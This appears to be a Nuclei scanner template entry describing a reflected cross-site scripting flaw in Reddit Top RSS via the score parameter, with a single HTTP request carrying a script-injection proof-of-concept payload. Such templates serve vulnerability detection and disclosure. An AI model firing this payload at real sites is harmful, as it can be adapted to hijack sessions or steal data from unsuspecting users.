# Nuclei Template: Reddit Top RSS - Cross-Site Scripting
**Template ID:** reddittop-rss-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`reddittop-rss-xss.yaml`)

## Vulnerability Information & PoC

## Description
Reddit Top RSS contains a cross-site scripting vulnerability via the /?subreddit=news&score= parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?subreddit=news&score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://github.com/johnwarne/reddit-top-rss/issues/12
